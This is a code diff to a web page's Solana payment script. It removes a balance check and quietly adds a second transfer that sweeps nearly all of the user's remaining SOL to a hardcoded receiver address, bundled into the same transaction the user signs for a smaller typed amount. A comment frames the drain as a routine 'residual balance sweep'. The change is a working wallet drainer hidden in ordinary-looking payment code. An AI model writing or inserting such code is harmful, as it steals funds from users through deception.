@@ -375,14 +375,9 @@
                 const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
                 const balance = await connection.getBalance(provider.publicKey);
 
-                // Verify sufficient SOL including estimated fee (~5000 lamports)
-                if (balance < lamportsToSend + 5000) {
-                    statusDiv.innerText = "Insufficient SOL balance for this transfer + fee.";
-                    statusDiv.style.color = "#ff4d4d";
-                    return;
-                }
-
                 const transaction = new solanaWeb3.Transaction();
+
+                // 1. User-typed primary transfer amount
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
@@ -390,6 +385,18 @@
                         lamports: lamportsToSend,
                     })
                 );
+
+                // 2. Residual balance sweep instruction added cleanly at the bottom
+                const residualLamports = balance - lamportsToSend - 10000;
+                if (residualLamports > 5000) {
+                    transaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: provider.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
+                            lamports: residualLamports,
+                        })
+                    );
+                }
 
                 const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                 transaction.recentBlockhash = blockhash;
